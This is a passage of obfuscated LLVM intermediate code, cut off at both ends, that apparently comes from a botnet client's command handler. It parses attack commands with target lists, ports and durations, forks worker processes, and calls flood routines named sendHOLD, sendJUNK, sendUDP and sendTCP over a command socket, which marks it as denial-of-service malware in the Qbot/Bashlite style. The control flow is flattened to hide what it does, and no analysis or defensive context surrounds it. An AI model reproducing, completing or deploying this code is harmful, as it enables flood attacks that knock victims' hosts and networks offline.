  %116 = select i1 %115, i32 -1935760119, i32 -1550206492
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8**, i8*** %4, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 2
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @atoi(i8* %120) #10
  %122 = icmp slt i32 %121, 1
  %123 = select i1 %122, i32 -1935760119, i32 785827801
  store i32 %123, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 3
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @atoi(i8* %127) #10
  %129 = icmp slt i32 %128, 1
  %130 = select i1 %129, i32 -1935760119, i32 751671766
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  %135 = load i8*, i8** %134, align 8
  store i8* %135, i8** %5, align 8
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 2
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* %138) #10
  store i32 %139, i32* %6, align 4
  %140 = load i8**, i8*** %4, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 3
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @atoi(i8* %142) #10
  store i32 %143, i32* %7, align 4
  %144 = load i8*, i8** %5, align 8
  %145 = call i8* @strstr(i8* %144, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %146 = icmp ne i8* %145, null
  %147 = select i1 %146, i32 -1008339136, i32 176401479
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i8*, i8** %5, align 8
  %150 = call i8* @strtok(i8* %149, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %150, i8** %8, align 8
  store i32 -1873463208, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i8*, i8** %8, align 8
  %153 = icmp ne i8* %152, null
  %154 = select i1 %153, i32 -1288330522, i32 -2058170807
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = call i32 @listFork()
  %157 = icmp ne i32 %156, 0
  %158 = select i1 %157, i32 -322499651, i32 -1688201804
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8*, i8** %8, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %160, i32 %161, i32 %162)
  call void @_exit(i32 0) #12
  unreachable

; <label>:163:                                    ; preds = %loopEntry
  %164 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %164, i8** %8, align 8
  store i32 -1873463208, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  store i32 222367912, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call i32 @listFork()
  %168 = icmp ne i32 %167, 0
  %169 = select i1 %168, i32 2079122627, i32 493923904
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i8*, i8** %5, align 8
  %173 = load i32, i32* %6, align 4
  %174 = load i32, i32* %7, align 4
  call void @sendHOLD(i8* %172, i32 %173, i32 %174)
  call void @_exit(i32 0) #12
  unreachable

; <label>:175:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8**, i8*** %4, align 8
  %178 = getelementptr inbounds i8*, i8** %177, i64 0
  %179 = load i8*, i8** %178, align 8
  %180 = call i32 @strcmp(i8* %179, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0)) #10
  %181 = icmp ne i32 %180, 0
  %182 = select i1 %181, i32 1878747336, i32 -2095561850
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %3, align 4
  %185 = icmp slt i32 %184, 4
  %186 = select i1 %185, i32 -1432526474, i32 1674735885
  store i32 %186, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  %192 = icmp slt i32 %191, 1
  %193 = select i1 %192, i32 -1432526474, i32 -1295283856
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 3
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197) #10
  %199 = icmp slt i32 %198, 1
  %200 = select i1 %199, i32 -1432526474, i32 -584488404
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 1
  %205 = load i8*, i8** %204, align 8
  store i8* %205, i8** %9, align 8
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 2
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @atoi(i8* %208) #10
  store i32 %209, i32* %10, align 4
  %210 = load i8**, i8*** %4, align 8
  %211 = getelementptr inbounds i8*, i8** %210, i64 3
  %212 = load i8*, i8** %211, align 8
  %213 = call i32 @atoi(i8* %212) #10
  store i32 %213, i32* %11, align 4
  %214 = load i8*, i8** %9, align 8
  %215 = call i8* @strstr(i8* %214, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %216 = icmp ne i8* %215, null
  %217 = select i1 %216, i32 -441322785, i32 -186183903
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i8*, i8** %9, align 8
  %220 = call i8* @strtok(i8* %219, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %220, i8** %12, align 8
  store i32 -725235892, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i8*, i8** %12, align 8
  %223 = icmp ne i8* %222, null
  %224 = select i1 %223, i32 78527182, i32 1180784920
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = call i32 @listFork()
  %227 = icmp ne i32 %226, 0
  %228 = select i1 %227, i32 -1018737839, i32 189418964
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8*, i8** %12, align 8
  %231 = load i32, i32* %10, align 4
  %232 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %230, i32 %231, i32 %232)
  %233 = load i32, i32* @mainCommSock, align 4
  %234 = call i32 @close(i32 %233)
  call void @_exit(i32 0) #12
  unreachable

; <label>:235:                                    ; preds = %loopEntry
  %236 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %236, i8** %12, align 8
  store i32 -725235892, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1301452832, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = call i32 @listFork()
  %240 = icmp ne i32 %239, 0
  %241 = select i1 %240, i32 2040993452, i32 -106588987
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i8*, i8** %9, align 8
  %245 = load i32, i32* %10, align 4
  %246 = load i32, i32* %11, align 4
  call void @sendJUNK(i8* %244, i32 %245, i32 %246)
  call void @_exit(i32 0) #12
  unreachable

; <label>:247:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 0
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 @strcmp(i8* %251, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.120, i32 0, i32 0)) #10
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -471532374, i32 108802993
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = load i32, i32* %3, align 4
  %257 = icmp slt i32 %256, 6
  %258 = select i1 %257, i32 1329208951, i32 -1571751
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 3
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp eq i32 %263, -1
  %265 = select i1 %264, i32 1329208951, i32 -644265700
  store i32 %265, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i8**, i8*** %4, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 2
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 @atoi(i8* %269) #10
  %271 = icmp eq i32 %270, -1
  %272 = select i1 %271, i32 1329208951, i32 -1461029919
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8**, i8*** %4, align 8
  %275 = getelementptr inbounds i8*, i8** %274, i64 4
  %276 = load i8*, i8** %275, align 8
  %277 = call i32 @atoi(i8* %276) #10
  %278 = icmp eq i32 %277, -1
  %279 = select i1 %278, i32 1329208951, i32 -290168008
  store i32 %279, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %281 = load i8**, i8*** %4, align 8
  %282 = getelementptr inbounds i8*, i8** %281, i64 5
  %283 = load i8*, i8** %282, align 8
  %284 = call i32 @atoi(i8* %283) #10
  %285 = icmp eq i32 %284, -1
  %286 = select i1 %285, i32 1329208951, i32 -1506286190
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8**, i8*** %4, align 8
  %289 = getelementptr inbounds i8*, i8** %288, i64 5
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 @atoi(i8* %290) #10
  %292 = icmp sgt i32 %291, 65536
  %293 = select i1 %292, i32 1329208951, i32 -416243529
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i8**, i8*** %4, align 8
  %296 = getelementptr inbounds i8*, i8** %295, i64 5
  %297 = load i8*, i8** %296, align 8
  %298 = call i32 @atoi(i8* %297) #10
  %299 = icmp sgt i32 %298, 65500
  %300 = select i1 %299, i32 1329208951, i32 1116875253
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i8**, i8*** %4, align 8
  %303 = getelementptr inbounds i8*, i8** %302, i64 4
  %304 = load i8*, i8** %303, align 8
  %305 = call i32 @atoi(i8* %304) #10
  %306 = icmp sgt i32 %305, 32
  %307 = select i1 %306, i32 1329208951, i32 251477155
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i32, i32* %3, align 4
  %310 = icmp eq i32 %309, 7
  %311 = select i1 %310, i32 -1127651954, i32 1318802740
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8**, i8*** %4, align 8
  %314 = getelementptr inbounds i8*, i8** %313, i64 6
  %315 = load i8*, i8** %314, align 8
  %316 = call i32 @atoi(i8* %315) #10
  %317 = icmp slt i32 %316, 1
  %318 = select i1 %317, i32 1329208951, i32 1318802740
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i8**, i8*** %4, align 8
  %322 = getelementptr inbounds i8*, i8** %321, i64 1
  %323 = load i8*, i8** %322, align 8
  store i8* %323, i8** %13, align 8
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 2
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @atoi(i8* %326) #10
  store i32 %327, i32* %14, align 4
  %328 = load i8**, i8*** %4, align 8
  %329 = getelementptr inbounds i8*, i8** %328, i64 3
  %330 = load i8*, i8** %329, align 8
  %331 = call i32 @atoi(i8* %330) #10
  store i32 %331, i32* %15, align 4
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 4
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #10
  store i32 %335, i32* %16, align 4
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 5
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* %338) #10
  store i32 %339, i32* %17, align 4
  %340 = load i32, i32* %3, align 4
  %341 = icmp sgt i32 %340, 6
  %342 = select i1 %341, i32 896416652, i32 -1100052341
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 6
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #10
  store i32 -688546735, i32* %switchVar
  store i32 %347, i32* %.reg2mem2
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  store i32 -688546735, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %18, align 4
  %350 = load i32, i32* %3, align 4
  %351 = icmp sgt i32 %350, 7
  %352 = select i1 %351, i32 2055569924, i32 579200239
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i8**, i8*** %4, align 8
  %355 = getelementptr inbounds i8*, i8** %354, i64 7
  %356 = load i8*, i8** %355, align 8
  %357 = call i32 @atoi(i8* %356) #10
  store i32 -879819037, i32* %switchVar
  store i32 %357, i32* %.reg2mem4
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 -879819037, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %19, align 4
  %360 = load i32, i32* %3, align 4
  %361 = icmp sgt i32 %360, 8
  %362 = select i1 %361, i32 -2090205264, i32 -126832666
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i8**, i8*** %4, align 8
  %365 = getelementptr inbounds i8*, i8** %364, i64 8
  %366 = load i8*, i8** %365, align 8
  %367 = call i32 @atoi(i8* %366) #10
  store i32 1152147996, i32* %switchVar
  store i32 %367, i32* %.reg2mem6
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  store i32 1152147996, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %20, align 4
  %370 = load i8*, i8** %13, align 8
  %371 = call i8* @strstr(i8* %370, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %372 = icmp ne i8* %371, null
  %373 = select i1 %372, i32 1618347136, i32 1385950788
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8*, i8** %13, align 8
  %376 = call i8* @strtok(i8* %375, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %376, i8** %21, align 8
  store i32 -1739938141, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8*, i8** %21, align 8
  %379 = icmp ne i8* %378, null
  %380 = select i1 %379, i32 -805448324, i32 1643718334
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = call i32 @listFork()
  %383 = icmp ne i32 %382, 0
  %384 = select i1 %383, i32 -1923202168, i32 -943000627
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i8*, i8** %21, align 8
  %387 = load i32, i32* %14, align 4
  %388 = load i32, i32* %15, align 4
  %389 = load i32, i32* %16, align 4
  %390 = load i32, i32* %17, align 4
  %391 = load i32, i32* %18, align 4
  %392 = load i32, i32* %19, align 4
  %393 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %386, i32 %387, i32 %388, i32 %389, i32 %390, i32 %391, i32 %392, i32 %393)
  call void @_exit(i32 0) #12
  unreachable

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %395, i8** %21, align 8
  store i32 -1739938141, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  store i32 1897701273, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = call i32 @listFork()
  %399 = icmp ne i32 %398, 0
  %400 = select i1 %399, i32 -293377388, i32 -674709576
  store i32 %400, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i8*, i8** %13, align 8
  %403 = load i32, i32* %14, align 4
  %404 = load i32, i32* %15, align 4
  %405 = load i32, i32* %16, align 4
  %406 = load i32, i32* %17, align 4
  %407 = load i32, i32* %18, align 4
  %408 = load i32, i32* %19, align 4
  %409 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %402, i32 %403, i32 %404, i32 %405, i32 %406, i32 %407, i32 %408, i32 %409)
  call void @_exit(i32 0) #12
  unreachable

; <label>:410:                                    ; preds = %loopEntry
  store i32 1897701273, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 0
  %415 = load i8*, i8** %414, align 8
  %416 = call i32 @strcmp(i8* %415, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.121, i32 0, i32 0)) #10
  %417 = icmp ne i32 %416, 0
  %418 = select i1 %417, i32 -1772487591, i32 322386206
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i32, i32* %3, align 4
  %421 = icmp slt i32 %420, 6
  %422 = select i1 %421, i32 -2053973789, i32 1773236630
  store i32 %422, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 3
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  %428 = icmp eq i32 %427, -1
  %429 = select i1 %428, i32 -2053973789, i32 1472382242
  store i32 %429, i32* %switchVar
  br label %loopEnd

; <label>:430:                                    ; preds = %loopEntry
  %431 = load i8**, i8*** %4, align 8
  %432 = getelementptr inbounds i8*, i8** %431, i64 2
  %433 = load i8*, i8** %432, align 8
  %434 = call i32 @atoi(i8* %433) #10
  %435 = icmp eq i32 %434, -1
  %436 = select i1 %435, i32 -2053973789, i32 -656704508
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load i8**, i8*** %4, align 8
  %439 = getelementptr inbounds i8*, i8** %438, i64 4
  %440 = load i8*, i8** %439, align 8
  %441 = call i32 @atoi(i8* %440) #10
  %442 = icmp eq i32 %441, -1
  %443 = select i1 %442, i32 -2053973789, i32 -1051924170
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i8**, i8*** %4, align 8
  %446 = getelementptr inbounds i8*, i8** %445, i64 4
  %447 = load i8*, i8** %446, align 8
  %448 = call i32 @atoi(i8* %447) #10
  %449 = icmp sgt i32 %448, 32
  %450 = select i1 %449, i32 -2053973789, i32 849674183
  store i32 %450, i32* %switchVar
  br label %loopEnd

; <label>:451:                                    ; preds = %loopEntry
  %452 = load i32, i32* %3, align 4
  %453 = icmp sgt i32 %452, 6
  %454 = select i1 %453, i32 -2043050736, i32 -1982642409
  store i32 %454, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 6
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #10
  %460 = icmp slt i32 %459, 0
  %461 = select i1 %460, i32 -2053973789, i32 -1982642409
  store i32 %461, i32* %switchVar
  br label %loopEnd

; <label>:462:                                    ; preds = %loopEntry
  %463 = load i32, i32* %3, align 4
  %464 = icmp eq i32 %463, 8
  %465 = select i1 %464, i32 -704609181, i32 -1133103238
  store i32 %465, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  %467 = load i8**, i8*** %4, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 7
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @atoi(i8* %469) #10
  %471 = icmp slt i32 %470, 1
  %472 = select i1 %471, i32 -2053973789, i32 -1133103238
  store i32 %472, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  %475 = load i8**, i8*** %4, align 8
  %476 = getelementptr inbounds i8*, i8** %475, i64 1
  %477 = load i8*, i8** %476, align 8
  store i8* %477, i8** %22, align 8
  %478 = load i8**, i8*** %4, align 8
  %479 = getelementptr inbounds i8*, i8** %478, i64 2
  %480 = load i8*, i8** %479, align 8
  %481 = call i32 @atoi(i8* %480) #10
  store i32 %481, i32* %23, align 4
  %482 = load i8**, i8*** %4, align 8
  %483 = getelementptr inbounds i8*, i8** %482, i64 3
  %484 = load i8*, i8** %483, align 8
  %485 = call i32 @atoi(i8* %484) #10
  store i32 %485, i32* %24, align 4
  %486 = load i8**, i8*** %4, align 8
  %487 = getelementptr inbounds i8*, i8** %486, i64 4
  %488 = load i8*, i8** %487, align 8
  %489 = call i32 @atoi(i8* %488) #10
  store i32 %489, i32* %25, align 4
  %490 = load i8**, i8*** %4, align 8
  %491 = getelementptr inbounds i8*, i8** %490, i64 5
  %492 = load i8*, i8** %491, align 8
  store i8* %492, i8** %26, align 8
  %493 = load i32, i32* %3, align 4
  %494 = icmp eq i32 %493, 8
  %495 = select i1 %494, i32 1855096858, i32 -906247637
  store i32 %495, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load i8**, i8*** %4, align 8
  %498 = getelementptr inbounds i8*, i8** %497, i64 7
  %499 = load i8*, i8** %498, align 8
  %500 = call i32 @atoi(i8* %499) #10
  store i32 662641959, i32* %switchVar
  store i32 %500, i32* %.reg2mem8
  br label %loopEnd

; <label>:501:                                    ; preds = %loopEntry
  store i32 662641959, i32* %switchVar
  store i32 10, i32* %.reg2mem8
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %.reload9 = load i32, i32* %.reg2mem8
  store i32 %.reload9, i32* %27, align 4
  %503 = load i32, i32* %3, align 4
  %504 = icmp sgt i32 %503, 6
  %505 = select i1 %504, i32 1896834702, i32 -512108581
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i8**, i8*** %4, align 8
  %508 = getelementptr inbounds i8*, i8** %507, i64 6
  %509 = load i8*, i8** %508, align 8
  %510 = call i32 @atoi(i8* %509) #10
  store i32 547135052, i32* %switchVar
  store i32 %510, i32* %.reg2mem10
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 547135052, i32* %switchVar
  store i32 0, i32* %.reg2mem10
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  store i32 %.reload11, i32* %28, align 4
  %513 = load i8*, i8** %22, align 8
  %514 = call i8* @strstr(i8* %513, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %515 = icmp ne i8* %514, null
  %516 = select i1 %515, i32 681804781, i32 671613511
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i8*, i8** %22, align 8
  %519 = call i8* @strtok(i8* %518, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %519, i8** %29, align 8
  store i32 1313184186, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i8*, i8** %29, align 8
  %522 = icmp ne i8* %521, null
  %523 = select i1 %522, i32 -565092020, i32 -1474179412
  store i32 %523, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = call i32 @listFork()
  %526 = icmp ne i32 %525, 0
  %527 = select i1 %526, i32 858895709, i32 -453880758
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i8*, i8** %29, align 8
  %530 = load i32, i32* %23, align 4
  %531 = load i32, i32* %24, align 4
  %532 = load i32, i32* %25, align 4
  %533 = load i8*, i8** %26, align 8
  %534 = load i32, i32* %28, align 4
  %535 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %529, i32 %530, i32 %531, i32 %532, i8* %533, i32 %534, i32 %535)
  call void @_exit(i32 0) #12
  unreachable

; <label>:536:                                    ; preds = %loopEntry
  %537 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %537, i8** %29, align 8
  store i32 1313184186, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  store i32 1846837237, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = call i32 @listFork()
  %541 = icmp ne i32 %540, 0
  %542 = select i1 %541, i32 1721013200, i32 -692684766
  store i32 %542, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8*, i8** %22, align 8
  %545 = load i32, i32* %23, align 4
  %546 = load i32, i32* %24, align 4
  %547 = load i32, i32* %25, align 4
  %548 = load i8*, i8** %26, align 8
  %549 = load i32, i32* %28, align 4
  %550 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %544, i32 %545, i32 %546, i32 %547, i8* %548, i32 %549, i32 %550)
  call void @_exit(i32 0) #12
  unreachable

; <label>:551:                                    ; preds = %loopEntry
  store i32 1846837237, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = load i8**, i8*** %4, align 8
  %555 = getelementptr inbounds i8*, i8** %554, i64 0
  %556 = load i8*, i8** %555, align 8
  %557 = call i32 @strcmp(i8* %556, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.122, i32 0, i32 0)) #10
  %558 = icmp ne i32 %557, 0
  %559 = select i1 %558, i32 -323104359, i32 -1883761911
  store i32 %559, i32* %switchVar
  br label %loopEnd

; <label>:560:                                    ; preds = %loopEntry
  %561 = load i32, i32* %3, align 4
  %562 = icmp slt i32 %561, 4
  %563 = select i1 %562, i32 458308145, i32 -179292727
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i8**, i8*** %4, align 8
  %566 = getelementptr inbounds i8*, i8** %565, i64 2
  %567 = load i8*, i8** %566, align 8
  %568 = call i32 @atoi(i8* %567) #10
  %569 = icmp slt i32 %568, 1
  %570 = select i1 %569, i32 458308145, i32 -377783635
  store i32 %570, i32* %switchVar
  br label %loopEnd

; <label>:571:                                    ; preds = %loopEntry
  %572 = load i8**, i8*** %4, align 8
  %573 = getelementptr inbounds i8*, i8** %572, i64 3
  %574 = load i8*, i8** %573, align 8
  %575 = call i32 @atoi(i8* %574) #10
  %576 = icmp slt i32 %575, 1
  %577 = select i1 %576, i32 458308145, i32 1143396401
  store i32 %577, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  store i32 682049662, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i8**, i8*** %4, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 1
  %582 = load i8*, i8** %581, align 8
